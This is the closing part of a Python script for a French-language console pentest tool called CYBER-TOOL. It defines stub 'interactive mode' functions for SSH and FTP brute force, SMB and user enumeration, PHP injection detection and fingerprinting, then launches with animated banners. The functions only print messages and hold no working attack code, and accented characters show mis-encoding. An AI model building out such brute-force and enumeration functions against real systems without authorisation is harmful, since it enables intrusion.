    print(f"[âš¡] Mode interactif pour rechercher des donnÃ©es sensibles sur {target}")
    # ğŸ”¥ Recherche interactive dans les fichiers exposÃ©s

def interactive_user_enum(target):
    """ğŸ‘¤ Mode interactif pour Ã©numÃ©rer les utilisateurs"""
    print(f"[âš¡] Mode interactif pour identifier des utilisateurs existants sur {target}")
    # ğŸ”¥ Test manuel des noms d'utilisateur

def interactive_php_eval_detection(target):
    """ğŸ˜ Mode interactif pour dÃ©tecter l'exÃ©cution de code PHP"""
    print(f"[âš¡] Mode interactif pour dÃ©tecter l'exÃ©cution de code PHP sur {target}")
    # ğŸ”¥ VÃ©rifier si PHP peut exÃ©cuter du code injectÃ©

def interactive_smb_enum(target):
    """ğŸ“‚ Mode interactif pour l'Ã©numÃ©ration SMB"""
    print(f"[âš¡] Mode interactif pour tester les partages SMB sur {target}")
    # ğŸ”¥ Analyse des partages accessibles

def interactive_ssh_bruteforce(target):
    """ğŸ”‘ Mode interactif pour tester un bruteforce SSH"""
    print(f"[âš¡] Mode interactif pour tester un bruteforce SSH sur {target}")
    # ğŸ”¥ Ajout d'une liste de mots de passe dynamiques

def interactive_ftp_bruteforce(target):
    """ğŸ”‘ Mode interactif pour tester un bruteforce FTP"""
    print(f"[âš¡] Mode interactif pour tester un bruteforce FTP sur {target}")
    # ğŸ”¥ Test de connexions FTP par dictionnaire

def interactive_web_fingerprint(target):
    """ğŸŒ Mode interactif pour le fingerprinting Web"""
    print(f"[âš¡] Mode interactif pour identifier les technologies Web utilisÃ©es par {target}")
    # ğŸ”¥ DÃ©tection interactive des technologies backend/frontend

def interactive_tls_analysis(target):
    """ğŸ” Mode interactif pour analyser TLS"""
    print(f"[âš¡] Mode interactif pour analyser le certificat TLS de {target}")
    # ğŸ”¥ Affichage interactif des dÃ©tails TLS

def interactive_browser_fingerprint(target):
    """ğŸŒ Mode interactif pour capturer lâ€™empreinte du navigateur"""
    print(f"[âš¡] Mode interactif pour rÃ©cupÃ©rer lâ€™empreinte du navigateur via {target}")
    # ğŸ”¥ Tester et capturer des headers spÃ©cifiques








# ğŸš€ Lancement propre et stable
if __name__ == "__main__":
    console.clear()

    # ğŸ”¥ Affichage unique de la banniÃ¨re et du message "DÃ©veloppÃ© par Karim"
    animated_banner()
    animated_karim()

    # ğŸ”¥ Chargements accÃ©lÃ©rÃ©s (sans rÃ©pÃ©tition)
    cyberpunk_loading("ğŸ” VÃ©rification des fichiers essentiels...", 2, "bold red", "earth")
    cyberpunk_loading("âš™ï¸ Connexion aux modules interactifs...", 2, "bold blue", "bouncingBall")
    cyberpunk_loading("ğŸ› ï¸ Chargement des configurations utilisateur...", 2, "bold magenta", "dots12")
    cyberpunk_loading("ğŸ“¡ Synchronisation des logs en temps rÃ©el...", 2, "bold yellow", "line")
    cyberpunk_loading("ğŸš€ DÃ©marrage de lâ€™environnement CYBER-TOOL...", 3, "bold green", "moon")

    # âœ… Suppression des animations temporaires pour Ã©viter les doublons
    console.clear()

    # âœ… Affichage unique et stable de la banniÃ¨re et du message "DÃ©veloppÃ© par Karim"
    animated_banner()
    animated_karim()

    # âœ… Lancement immÃ©diat de CyberTool sans rÃ©pÃ©tition des animations
    cyber_tool = CyberTool()
    cyber_tool.run_tool()
